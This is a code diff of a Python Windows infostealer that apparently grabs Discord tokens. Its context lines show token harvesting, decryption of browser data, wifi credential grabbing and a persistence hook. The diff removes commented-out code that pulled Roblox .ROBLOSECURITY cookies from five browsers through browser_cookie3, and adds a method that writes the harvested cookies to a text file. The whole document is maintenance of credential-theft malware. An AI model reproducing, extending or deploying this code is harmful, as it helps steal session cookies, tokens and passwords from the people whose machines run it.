@@ -1,4 +1,4 @@
-import os, re, requests, subprocess, random, time, shutil, zipfile, sys, sqlite3, json, base64, browser_cookie3, ctypes
+import os, re, requests, subprocess, random, time, shutil, zipfile, sys, sqlite3, json, base64, ctypes
 from threading import Thread
 import win32crypt
 from Cryptodome.Cipher import AES
@@ -60,7 +60,7 @@ class main():
 			if os.path.exists(path): self.get_tokens(path)
 		self.writeTokens()
 		for plt, pth in self.browserpaths.items(): self.grabBrowserInfo(plt, pth)
-		self.GrabRoblox()
+		self.writeRoblox()
 		self.grabwifi()
 
 		if config["Startup"]: self.startup()
@@ -351,32 +351,7 @@ class main():
 			f.close()
 			if open(f, 'r') == "": os.remove(os.path.join(self.tempfolder, f))
 
-	def GrabRoblox(self):
-		#try:
-		#	cookie = browser_cookie3.brave(domain_name='roblox.com')
-		#	if not cookie in self.roblosecurity:
-		#		self.roblosecurity.append(str(cookie).split(".ROBLOSECURITY=")[1].split(" for .roblox.com")[0])
-		#except: pass
-		#try:
-		#	cookie = browser_cookie3.chrome(domain_name='roblox.com')
-		#	if not cookie in self.roblosecurity:
-		#		self.roblosecurity.append(str(cookie).split(".ROBLOSECURITY=")[1].split(" for .roblox.com")[0])
-		#except: pass
-		#try:
-		#	cookie = browser_cookie3.edge(domain_name='roblox.com')
-		#	if not cookie in self.roblosecurity:
-		#		self.roblosecurity.append(str(cookie).split(".ROBLOSECURITY=")[1].split(" for .roblox.com")[0])
-		#except: pass
-		#try:
-		#	cookie = browser_cookie3.firefox(domain_name='roblox.com')
-		#	if not cookie in self.roblosecurity:
-		#		self.roblosecurity.append(str(cookie).split(".ROBLOSECURITY=")[1].split(" for .roblox.com")[0])
-		#except: pass
-		#try:
-		#	cookie = browser_cookie3.opera(domain_name='roblox.com')
-		#	if not cookie in self.roblosecurity:
-		#		self.roblosecurity.append(str(cookie).split(".ROBLOSECURITY=")[1].split(" for .roblox.com")[0])
-		#except: pass
+	def writeRoblox(self):
 		res = [*set(self.roblosecurity)]
 		open(os.path.join(self.tempfolder, "Roblox.txt"), 'a').write('\n\n'.join(res))
 	
